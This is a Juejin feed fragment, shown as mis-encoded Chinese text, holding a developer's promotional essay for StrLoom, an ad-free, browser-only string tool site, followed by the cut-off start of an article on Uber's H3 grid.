a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å†™åœ¨å‰é¢</h2>
<p>è¿™ä¸æ˜¯ä¸€ç¯‡äº§å“æ¨å¹¿æ–‡ã€‚</p>
<p>æˆ–è€…è¯´ï¼Œæˆ‘ä¸æƒ³è®©å®ƒçœ‹èµ·æ¥åƒã€‚</p>
<p>å¦‚æœä½ ç‚¹è¿›æ¥æ˜¯æƒ³çœ‹"åŠŸèƒ½å¼ºå¤§"ã€"ä¸€ç«™å¼è§£å†³"ã€"æ•ˆç‡æå‡ 300%"è¿™ç±»è¯æœ¯ï¼Œå¯èƒ½è¦è®©ä½ å¤±æœ›äº†ã€‚æˆ‘æƒ³èŠçš„ï¼Œæ˜¯åœ¨è¿™ä¸ªå·¥å…·ç«™èƒŒåï¼Œä¸€ä¸ªå¼€å‘è€…å¯¹"ä»·å€¼"è¿™ä»¶äº‹çš„æ€è€ƒã€‚</p>
<hr/>
<h2 data-id="heading-1">ä¸€ã€å½“æˆ‘ä»¬è°ˆè®ºå·¥å…·æ—¶ï¼Œæˆ‘ä»¬åœ¨è°ˆè®ºä»€ä¹ˆ</h2>
<p>æ‰“å¼€æµè§ˆå™¨ï¼Œæœç´¢"JSON æ ¼å¼åŒ–å·¥å…·"ï¼Œä½ ä¼šå¾—åˆ°å‡ åä¸‡ä¸ªç»“æœã€‚</p>
<p>å†æœ"Base64 ç¼–ç "ã€"å›¾ç‰‡æ–‡å­—è¯†åˆ«"ï¼Œç»“æœåªä¼šæ›´å¤šã€‚</p>
<p>å·¥å…·ç«™ï¼Œæ—©å·²æ˜¯çº¢æµ·ä¸­çš„çº¢æµ·ã€‚æ¯ä¸€ä¸ªçœ‹èµ·æ¥éƒ½å·®ä¸å¤šï¼šè¾“å…¥æ¡†ã€æŒ‰é’®ã€è¾“å‡ºæ¡†ï¼Œå†é…ä¸Šæ»¡å±çš„å¹¿å‘Šå’Œ"ç«‹å³å‡çº§ VIP"çš„å¼¹çª—ã€‚</p>
<p>é‚£æˆ‘ä¸ºä»€ä¹ˆè¿˜è¦åšä¸€ä¸ªï¼Ÿ</p>
<p>ç­”æ¡ˆå¾ˆç®€å•ï¼š<strong>å› ä¸ºæˆ‘è‡ªå·±éœ€è¦ï¼Œè€Œå¸‚é¢ä¸Šçš„å·¥å…·è®©æˆ‘ä¸èˆ’æœã€‚</strong></p>
<p>ä¸æ˜¯åŠŸèƒ½ä¸å¤Ÿï¼Œæ°æ°ç›¸åï¼Œæ˜¯"å¤ªå¤šäº†"ã€‚</p>
<p>å¤ªå¤šçš„å¼¹çª—ã€å¤ªå¤šçš„è¿½è¸ªã€å¤ªå¤šçš„"æ™ºèƒ½æ¨è"ã€å¤ªå¤šçš„"ä¼šå‘˜ä¸“äº«"ã€‚æˆ‘åªæ˜¯æƒ³æ ¼å¼åŒ–ä¸€æ®µ JSONï¼Œä¸ºä»€ä¹ˆè¦æ³¨å†Œè´¦å·ï¼Ÿæˆ‘åªæ˜¯æƒ³è§£ç ä¸€æ®µ Base64ï¼Œä¸ºä»€ä¹ˆè¦çœ‹ä¸‰ç§’å¹¿å‘Šï¼Ÿ</p>
<p><strong>å·¥å…·çš„æœ¬è´¨ï¼Œåº”è¯¥æ˜¯è§£å†³é—®é¢˜ï¼Œè€Œä¸æ˜¯åˆ¶é€ é—®é¢˜ã€‚</strong></p>
<p>äºæ˜¯ï¼Œæˆ‘åšäº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fstrloom.com" target="_blank" title="https://strloom.com" ref="nofollow noopener noreferrer">StrLoom</a>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e1fe722f2c546ef97a6d9ad6a1dd0d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214591&amp;x-signature=ucf%2FIMQ01iWVSMjGtcrBlepdUi4%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">äºŒã€ä»·å€¼æºè‡ªéœ€æ±‚ï¼šä¸€ä¸ªå¼€å‘è€…çš„æ—¥å¸¸å›°å¢ƒ</h2>
<p>ä½œä¸ºä¸€ä¸ªå¼€å‘è€…ï¼Œæˆ‘æ¯å¤©éƒ½åœ¨å’Œå­—ç¬¦ä¸²æ‰“äº¤é“ã€‚</p>
<ul>
<li>åç«¯è¿”å›çš„ JSON æ˜¯å‹ç¼©çš„ï¼Œçœ‹ä¸æ¸…ç»“æ„</li>
<li>æ¥å£ä¼ å‚éœ€è¦ Base64 ç¼–ç ï¼Œæ‰‹åŠ¨è½¬æ¢å¤ªéº»çƒ¦</li>
<li>äº§å“å‘æ¥ä¸€å¼ æˆªå›¾ï¼Œé‡Œé¢æœ‰ä¸€æ®µä»£ç ï¼Œæˆ‘éœ€è¦æŠŠå®ƒæå–å‡ºæ¥</li>
<li>ä» PDF å¤åˆ¶çš„æ–‡æœ¬ï¼Œæ»¡æ˜¯æ¢è¡Œç¬¦å’Œå¤šä½™ç©ºæ ¼ï¼Œç²˜è´´åˆ°ä»£ç é‡Œå°±æŠ¥é”™</li>
</ul>
<p>è¿™äº›åœºæ™¯ï¼Œæ¯å¤©éƒ½åœ¨å‘ç”Ÿã€‚</p>
<p>æˆ‘éœ€è¦çš„ï¼Œä¸æ˜¯ä¸€ä¸ª"åŠŸèƒ½å…¨é¢"çš„å·¥å…·ç«™ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>å¿«é€Ÿã€å¹²å‡€ã€ä¸æ‰“æ‰°æˆ‘çš„å·¥å…·</strong>ã€‚</p>
<ul>
<li>ä¸éœ€è¦æ³¨å†Œ</li>
<li>ä¸éœ€è¦ä¸Šä¼ åˆ°æœåŠ¡å™¨</li>
<li>ä¸éœ€è¦ç­‰å¾…åŠ è½½</li>
<li>ä¸éœ€è¦å…³é—­å¹¿å‘Š</li>
</ul>
<p><strong>åªéœ€è¦æ‰“å¼€ï¼Œç²˜è´´ï¼Œç‚¹å‡»ï¼Œå¤åˆ¶ã€‚</strong></p>
<p>è¿™å°±æ˜¯ StrLoom çš„å…¨éƒ¨ã€‚</p>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€StrLoom å’Œå…¶ä»–å·¥å…·ç«™æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</h2>
<h3 data-id="heading-4">1. çº¯å‰ç«¯ï¼Œé›¶è¿½è¸ª</h3>
<p>æ‰€æœ‰å¤„ç†éƒ½åœ¨ä½ çš„æµè§ˆå™¨ä¸­å®Œæˆã€‚</p>
<p>ä½ çš„æ•°æ®ä¸ä¼šä¸Šä¼ åˆ°ä»»ä½•æœåŠ¡å™¨ï¼Œä¸ä¼šè¢«è®°å½•ï¼Œä¸ä¼šè¢«åˆ†æï¼Œä¸ä¼šè¢«"ç”¨äºæ”¹è¿›æœåŠ¡"ã€‚</p>
<p><strong>ä½ çš„æ•°æ®ï¼Œåªå±äºä½ ã€‚</strong></p>
<h3 data-id="heading-5">2. æç®€è®¾è®¡ï¼Œä¸“æ³¨ä½“éªŒ</h3>
<p>æ²¡æœ‰å¹¿å‘Šï¼Œæ²¡æœ‰å¼¹çª—ï¼Œæ²¡æœ‰"å‡çº§ä¼šå‘˜"ã€‚</p>
<p>ç•Œé¢æ˜¯èµ›åšæœ‹å…‹é£æ ¼çš„æ·±è‰²ä¸»é¢˜ï¼Œé…è‰²æ˜¯éœ“è™¹é’ã€ç´«ã€ç²‰ï¼Œè§†è§‰ä¸Šèˆ’é€‚ï¼ŒåŠŸèƒ½ä¸Šç›´è§‚ã€‚</p>
<p><strong>å·¥å…·å°±æ˜¯å·¥å…·ï¼Œä¸åº”è¯¥æˆä¸ºè´Ÿæ‹…ã€‚</strong></p>
<h3 data-id="heading-6">3. åŠŸèƒ½ç²¾å‡†ï¼Œä¸è´ªå¤š</h3>
<p>StrLoom åªåšå››ä»¶äº‹ï¼š</p>
<ul>
<li><strong>JSON æ ¼å¼åŒ–</strong>ï¼šæ”¯æŒæ ¼å¼åŒ–ã€å‹ç¼©ã€æ¨¡æ¿åˆå¹¶ï¼ˆè¿™æ˜¯å…¶ä»–å·¥å…·å°‘æœ‰çš„åŠŸèƒ½ï¼‰</li>
<li><strong>ç¼–ç /è§£ç </strong>ï¼šBase64ã€URLã€Unicodeã€Hexï¼Œä¸€é”®åˆ‡æ¢</li>
<li><strong>å›¾ç‰‡ OCR</strong>ï¼šæ”¯æŒç²˜è´´å›¾ç‰‡ï¼Œæœ¬åœ°è¯†åˆ«æ–‡å­—ï¼ˆåŸºäº Tesseract.jsï¼‰</li>
<li><strong>æ–‡æœ¬æ¸…ç†</strong>ï¼šå»é™¤æ¢è¡Œã€å¤šä½™ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ï¼Œè®©æ–‡æœ¬"å¹²å‡€"</li>
</ul>
<p>æ¯ä¸ªåŠŸèƒ½éƒ½æ˜¯æˆ‘è‡ªå·±é«˜é¢‘ä½¿ç”¨çš„ï¼Œæ¯ä¸ªç»†èŠ‚éƒ½æ˜¯æˆ‘åå¤æ‰“ç£¨çš„ã€‚</p>
<p><strong>ä¸æ±‚å¤§è€Œå…¨ï¼Œåªæ±‚å°è€Œç¾ã€‚</strong></p>
<hr/>
<h2 data-id="heading-7">å››ã€ä»·å€¼ã€å…±è¯†ã€æ¨¡å¼ï¼šä¸€ä¸ªè¶…çº§ä¸ªä½“çš„å•†ä¸šæ€è€ƒ</h2>
<p>åš StrLoomï¼Œä¸åªæ˜¯ä¸ºäº†è§£å†³è‡ªå·±çš„éœ€æ±‚ã€‚</p>
<p>æˆ‘æƒ³è¡¨è¾¾çš„ï¼Œæ˜¯ä¸€ç§å¯¹"ä»·å€¼"çš„ç†è§£ï¼š</p>
<blockquote>
<p><strong>ä»·å€¼æºè‡ªéœ€æ±‚ï¼Œå› ä¸ºè¢«éœ€æ±‚ï¼Œæ‰€ä»¥æ‰æœ‰ä»·å€¼ã€‚</strong><br/>
<strong>å…±è¯†æ¥è‡ªäºåˆ†æ­§çš„è¶…è¶Šï¼Œå…±è¯†çš„æˆæœæ˜¯æˆäº¤ä¸å…³ç³»ã€‚</strong><br/>
<strong>æ¨¡å¼æ˜¯è‡ªå·±å¦‚ä½•ç”Ÿå­˜ä¸å‘å±•ï¼Œæ¯ä¸ªäººã€æ¯ä¸ªä¼ä¸šéƒ½æ˜¯è‡ªèº«æ¨¡å¼ä¸ç¯å¢ƒäº’åŠ¨çš„äº§ç‰©ã€‚</strong></p>
</blockquote>
<p>è¿™ä¸‰å¥è¯ï¼Œæ„æˆäº†ä¸€ä¸ªå•†ä¸šé—­ç¯ï¼š</p>
<ol>
<li><strong>æ´å¯Ÿéœ€æ±‚</strong> â†’ æˆ‘å‘ç°å¼€å‘è€…éœ€è¦ä¸€ä¸ªå¹²å‡€ã€å¿«é€Ÿã€éšç§çš„å·¥å…·ç«™</li>
<li><strong>æä¾›ä»·å€¼</strong> â†’ æˆ‘åšäº† StrLoomï¼Œè§£å†³è¿™ä¸ªéœ€æ±‚</li>
<li><strong>è¾¾æˆå…±è¯†</strong> â†’ ç”¨æˆ·è®¤å¯è¿™ä¸ªä»·å€¼ï¼Œä½¿ç”¨ã€åˆ†äº«ã€æ¨è</li>
<li><strong>è·å¾—æˆäº¤ä¸å…³ç³»</strong> â†’ æˆ‘è·å¾—äº†ç”¨æˆ·ã€åé¦ˆã€å½±å“åŠ›</li>
<li><strong>æŠ•èµ„è‡ªå·±</strong> â†’ æˆ‘ç”¨è¿™äº›èµ„æºç»§ç»­ä¼˜åŒ–äº§å“ï¼Œæå‡ç«äº‰åŠ›</li>
</ol>
<p>è¿™å°±æ˜¯æˆ‘ç†è§£çš„"è¶…çº§ä¸ªä½“"çš„ç”Ÿå­˜æ–¹å¼ã€‚</p>
<p><strong>ä¸ä¾é™„äºå¹³å°ï¼Œä¸è¿½é€é£å£ï¼Œä¸ç›²ç›®æ‰©å¼ ã€‚</strong></p>
<p><strong>åªåšè‡ªå·±æ“…é•¿çš„äº‹ï¼ŒåªæœåŠ¡çœŸæ­£éœ€è¦çš„äººï¼Œåªå»ºç«‹çœŸå®çš„è¿æ¥ã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25684cd4d90d4bd3a4649702e235b792~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214591&amp;x-signature=rS%2Fs6GWgrNvh4tcoI0dlFK9Gcxc%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-8">äº”ã€æˆ‘ä¸æƒ³æˆä¸ºæ—¶ä»£çš„ API</h2>
<p>è¿™ä¸ªæ—¶ä»£ï¼Œå¤ªå¤šäººåœ¨åš"API"ã€‚</p>
<p>ä»€ä¹ˆæ„æ€ï¼Ÿ</p>
<p>å°±æ˜¯æŠŠè‡ªå·±å˜æˆä¸€ä¸ª"æ¥å£"ï¼Œè¾“å…¥éœ€æ±‚ï¼Œè¾“å‡ºç»“æœï¼Œä¸­é—´æ²¡æœ‰æ€è€ƒï¼Œæ²¡æœ‰ä¸ªæ€§ï¼Œæ²¡æœ‰æ¸©åº¦ã€‚</p>
<ul>
<li>çœ‹åˆ° AI ç«äº†ï¼Œå°±åš AI å·¥å…·</li>
<li>çœ‹åˆ°çŸ­è§†é¢‘ç«äº†ï¼Œå°±åšçŸ­è§†é¢‘å·¥å…·</li>
<li>çœ‹åˆ° Web3 ç«äº†ï¼Œå°±åš Web3 å·¥å…·</li>
</ul>
<p><strong>è¿½ç€é£å£è·‘ï¼Œå´ä¸çŸ¥é“è‡ªå·±åœ¨è·‘ä»€ä¹ˆã€‚</strong></p>
<p>æˆ‘ä¸æƒ³è¿™æ ·ã€‚</p>
<p>æˆ‘æƒ³åšä¸€ä¸ª<strong>æœ‰è‡ªå·±èº«ä»½çš„è¶…çº§ä¸ªä½“</strong>ã€‚</p>
<p>æˆ‘æœ‰è‡ªå·±çš„å®¡ç¾ã€è‡ªå·±çš„ä»·å€¼è§‚ã€è‡ªå·±çš„èŠ‚å¥ã€‚</p>
<p>æˆ‘åš StrLoomï¼Œä¸æ˜¯å› ä¸º"å·¥å…·ç«™"æ˜¯é£å£ï¼Œè€Œæ˜¯å› ä¸º<strong>æˆ‘è‡ªå·±éœ€è¦ï¼Œæˆ‘ç›¸ä¿¡ä¹Ÿæœ‰äººå’Œæˆ‘ä¸€æ ·éœ€è¦</strong>ã€‚</p>
<p>æˆ‘å¸Œæœ›é€šè¿‡è¿™ä¸ªå·¥å…·ç«™ï¼Œè¿æ¥æ›´å¤š<strong>æœ‰çœŸå®éœ€æ±‚ã€æœ‰è¡¨è¾¾æ¬²ã€æœ‰åˆ›é€ åŠ›çš„æ„å»ºè€…</strong>ã€‚</p>
<p><strong>æˆ‘ä»¬ä¸æ˜¯åœ¨æ¶ˆè´¹å·¥å…·ï¼Œè€Œæ˜¯åœ¨å…±åŒåˆ›é€ ä¸€ç§æ›´å¥½çš„å¼€å‘ä½“éªŒã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17e36dc2ae9542198803d3e23bbab54a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IiS5LiA56yR5LiN56eD5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766214591&amp;x-signature=l2%2BawoTwFF2%2F3VTA9HPlFoUkT1g%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-9">å…­ã€StrLoom çš„æœªæ¥</h2>
<p>StrLoom ç°åœ¨è¿˜å¾ˆç®€å•ï¼Œåªæœ‰å››ä¸ªåŠŸèƒ½ã€‚</p>
<p>ä½†æˆ‘ä¸æ‰“ç®—è®©å®ƒå˜æˆ"å¤§è€Œå…¨"çš„å·¥å…·ç«™ã€‚</p>
<p>æˆ‘ä¼šç»§ç»­æ‰“ç£¨è¿™å››ä¸ªåŠŸèƒ½ï¼Œè®©å®ƒä»¬æ›´å¿«ã€æ›´ç¨³å®šã€æ›´å¥½ç”¨ã€‚</p>
<p>æˆ‘ä¹Ÿä¼šæ ¹æ®ç”¨æˆ·çš„åé¦ˆï¼Œæ…¢æ…¢åŠ å…¥æ–°çš„åŠŸèƒ½â€”â€”ä½†å‰ææ˜¯ï¼Œ<strong>è¿™äº›åŠŸèƒ½æ˜¯çœŸå®éœ€æ±‚ï¼Œè€Œä¸æ˜¯ä¸ºäº†"çœ‹èµ·æ¥åŠŸèƒ½å¤š"</strong>ã€‚</p>
<p>æˆ‘å¸Œæœ› StrLoom æˆä¸ºä¸€ä¸ª<strong>æœ‰æ¸©åº¦çš„å·¥å…·ç«™</strong>ã€‚</p>
<p>ä¸æ˜¯å†·å†°å†°çš„"è¾“å…¥-è¾“å‡º"ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>è®©å¼€å‘è€…æ„Ÿåˆ°èˆ’é€‚ã€ä¿¡ä»»ã€æ„‰æ‚¦çš„åœ°æ–¹</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-10">ä¸ƒã€å†™åœ¨æœ€å</h2>
<p>å¦‚æœä½ çœ‹åˆ°è¿™é‡Œï¼Œè°¢è°¢ä½ çš„è€å¿ƒã€‚</p>
<p>æˆ‘çŸ¥é“è¿™ç¯‡æ–‡ç« æœ‰ç‚¹é•¿ï¼Œæœ‰ç‚¹"ä¸åƒæ¨å¹¿æ–‡"ã€‚</p>
<p>ä½†æˆ‘æƒ³è¯´çš„ï¼Œä¸åªæ˜¯"æ¥ç”¨æˆ‘çš„å·¥å…·å§"ï¼Œè€Œæ˜¯ï¼š</p>
<p><strong>åœ¨è¿™ä¸ªå·¥å…·æ³›æ»¥çš„æ—¶ä»£ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜èƒ½åšä¸€äº›"ä¸ä¸€æ ·"çš„ä¸œè¥¿ï¼Ÿ</strong></p>
<p><strong>åœ¨è¿™ä¸ªè¿½é€æµé‡çš„æ—¶ä»£ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜èƒ½åšæŒä¸€äº›"æ…¢"çš„ä»·å€¼ï¼Ÿ</strong></p>
<p><strong>åœ¨è¿™ä¸ªäººäººéƒ½æƒ³æˆä¸º"API"çš„æ—¶ä»£ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜èƒ½ä¿æŒè‡ªå·±çš„èº«ä»½ï¼Ÿ</strong></p>
<p>StrLoom æ˜¯æˆ‘çš„ç­”æ¡ˆã€‚</p>
<p>å¦‚æœä½ ä¹Ÿè®¤åŒè¿™äº›æƒ³æ³•ï¼Œæ¬¢è¿æ¥è¯•è¯•ï¼š</p>
<p>ğŸ‘‰ <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fstrloom.com" target="_blank" title="https://strloom.com" ref="nofollow noopener noreferrer">strloom.com</a></strong></p>
<p>å¦‚æœä½ æœ‰ä»»ä½•å»ºè®®ã€åé¦ˆã€æˆ–è€…åªæ˜¯æƒ³èŠèŠå¤©ï¼Œæ¬¢è¿è”ç³»æˆ‘ã€‚</p>
<p><strong>è®©æˆ‘ä»¬ä¸€èµ·ï¼Œç”¨å¿ƒç¼–ç ï¼Œä¸€æ¬¡ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</strong></p>
<hr/>
<h2 data-id="heading-11">é™„ï¼šStrLoom åŠŸèƒ½é€Ÿè§ˆ</h2>
<h3 data-id="heading-12">1. JSON æ ¼å¼åŒ–</h3>
<ul>
<li>ä¸€é”®æ ¼å¼åŒ–/å‹ç¼© JSON</li>
<li>æ”¯æŒæ¨¡æ¿åˆå¹¶ï¼ˆç‹¬ç‰¹åŠŸèƒ½ï¼‰</li>
<li>å®æ—¶é”™è¯¯æç¤º</li>
</ul>
<h3 data-id="heading-13">2. ç¼–ç /è§£ç </h3>
<ul>
<li>æ”¯æŒ Base64ã€URLã€Unicodeã€Hex</li>
<li>ä¸€é”®åˆ‡æ¢ç¼–ç ç±»å‹</li>
<li>åŒå‘è½¬æ¢</li>
</ul>
<h3 data-id="heading-14">3. å›¾ç‰‡ OCR</h3>
<ul>
<li>æ”¯æŒç²˜è´´å›¾ç‰‡ï¼ˆCtrl+Vï¼‰</li>
<li>æœ¬åœ°è¯†åˆ«ï¼Œæ— éœ€ä¸Šä¼ </li>
<li>åŸºäº Tesseract.js</li>
</ul>
<h3 data-id="heading-15">4. æ–‡æœ¬æ¸…ç†</h3>
<ul>
<li>å»é™¤æ¢è¡Œã€å¤šä½™ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦</li>
<li>å®æ—¶æ˜¾ç¤ºå­—ç¬¦æ•°å˜åŒ–</li>
<li>ä¸€é”®å¤åˆ¶ç»“æœ</li>
</ul>
<hr/>
<p><strong>StrLoom: è®©å­—ç¬¦ä¸²æ‰¾åˆ°å½’å®¿ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€å‘å¯æŒæ¡çš„çŸ¥è¯†ï¼šuber H3ç½‘æ ¼]]></title>    <link>https://juejin.cn/post/7582861402277871650</link>    <guid>https://juejin.cn/post/7582861402277871650</guid>    <pubDate>2025-12-13T06:38:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582861402277871650" data-draft-id="7573710392212324379" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€å‘å¯æŒæ¡çš„çŸ¥è¯†ï¼šuber H3ç½‘æ ¼"/> <meta itemprop="keywords" content="åç«¯,ç®—æ³•"/> <meta itemprop="datePublished" content="2025-12-13T06:38:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰å¹´ä¹‹çº¦"/> <meta itemprop="url" content="https://juejin.cn/user/3448523142729784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€å‘å¯æŒæ¡çš„çŸ¥è¯†ï¼šuber H3ç½‘æ ¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3448523142729784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰å¹´ä¹‹çº¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T06:38:45.000Z" title="Sat Dec 13 2025 06:38:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body 